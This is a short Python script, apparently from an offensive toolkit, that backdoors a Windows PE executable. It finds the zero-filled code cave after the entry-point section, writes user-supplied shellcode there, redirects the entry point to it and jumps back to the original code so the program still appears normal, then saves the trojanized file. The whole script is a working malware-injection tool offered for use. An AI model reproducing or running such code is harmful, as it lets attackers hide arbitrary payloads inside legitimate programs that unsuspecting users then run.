from pefile import PE
from struct import pack
import os
import re
from random import randint


#REF : http://www.debasish.in/2013/06/injecting-shellcode-into-portable.html
#https://github.com/b3mb4m/PythonVIRUS/blob/master/BombermansLAB/CodeCave/finder.py


def covecavelenght( pe):
	#pe = pefile.PE( exe)
	db = ""
	for x in pe.sections:
		db += x.get_data().encode("hex")
	cache = re.findall("..?", db)

	cout = 0
	maxtotal = 0
	for x in cache:
		if x == "00":
			cout += 1
			maxtotal = cout
		else:
			cout = 0
	return maxtotal



def main( exe_file, shellcode):
	if not (os.path.isfile( exe_file)):
		print("\nExecutable file cant detected ! \n Please try with full path.\n")	
		return False

	shellcode = shellcode.replace("\\x", "").decode("hex")

	pe = PE(exe_file)
	OEP = pe.OPTIONAL_HEADER.AddressOfEntryPoint
	pe_sections = pe.get_section_by_rva(pe.OPTIONAL_HEADER.AddressOfEntryPoint)
	align = pe.OPTIONAL_HEADER.SectionAlignment
	what_left = (pe_sections.VirtualAddress + pe_sections.Misc_VirtualSize) - pe.OPTIONAL_HEADER.AddressOfEntryPoint
	end_rva = pe.OPTIONAL_HEADER.AddressOfEntryPoint + what_left
	padd = align - (end_rva % align)
	e_offset = pe.get_offset_from_rva(end_rva+padd) - 1
	scode_size = len(shellcode)+7
	
	if padd < scode_size:
		print("\nEnough space is not available for shellcode")
		print("Available codecave len : {0} \n").format( covecavelenght( pe))
		return False
	else:
		scode_end_off = e_offset
		scode_start_off = scode_end_off - scode_size
		pe.OPTIONAL_HEADER.AddressOfEntryPoint = pe.get_rva_from_offset(scode_start_off)
		raw_pe_data = pe.write()
		jmp_to = OEP - pe.get_rva_from_offset(scode_end_off)
		shellcode = '\x60%s\x61\xe9%s' % (shellcode, pack('I', jmp_to & 0xffffffff))
		final_data = list(raw_pe_data)
		final_data[scode_start_off:scode_start_off+len(shellcode)] = shellcode
		final_data = ''.join(final_data)
		raw_pe_data = final_data
		pe.close()
		

		while True:
			final_pe_file = "{0}".format(str(randint(0, 999999999)))
			if not os.path.isfile(final_pe_file):
				break

		new_file = open(final_pe_file, 'wb')
		new_file.write(raw_pe_data)
		new_file.close()
		print ("\nNew file : {0} saved !").format( final_pe_file)
		print ('[*] Job Done! :)')

